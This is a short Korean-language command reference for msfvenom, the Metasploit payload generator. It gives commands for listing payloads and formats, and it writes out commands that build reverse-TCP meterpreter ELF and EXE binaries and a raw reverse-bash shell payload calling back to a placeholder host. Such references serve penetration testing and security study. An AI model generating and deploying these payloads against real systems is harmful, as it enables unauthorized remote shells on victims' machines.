# msfvenom

> metasploit용 페이로드를 수동으로 생성하는 도구.
> 더 많은 정보: <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>.

- 사용 가능한 페이로드 목록 표시:

`msfvenom {{[-l|--list]}} payloads`

- 사용 가능한 출력 형식 목록 표시:

`msfvenom {{[-l|--list]}} formats`

- 특정 페이로드의 옵션 표시:

`msfvenom {{[-p|--payload]}} {{페이로드}} --list-options`

- 리버스 TCP 연결을 사용하는 ELF 실행 파일 생성:

`msfvenom {{[-p|--payload]}} linux/x64/meterpreter/reverse_tcp LHOST={{로컬_아이피}} LPORT={{로컬_포트}} {{[-f|--format]}} elf {{[-o|--out]}} {{경로/대상/바이너리}}`

- 리버스 TCP 연결을 사용하는 EXE 실행 파일 생성:

`msfvenom {{[-p|--payload]}} windows/x64/meterpreter/reverse_tcp LHOST={{로컬_아이피}} LPORT={{로컬_포트}} {{[-f|--format]}} exe {{[-o|--out]}} {{경로/대상/바이너리.exe}}`

- 리버스 TCP 연결을 사용하는 원시(raw) Bash 페이로드 생성:

`msfvenom {{[-p|--payload]}} cmd/unix/reverse_bash LHOST={{로컬_아이피}} LPORT={{로컬_포트}} {{[-f|--format]}} raw`
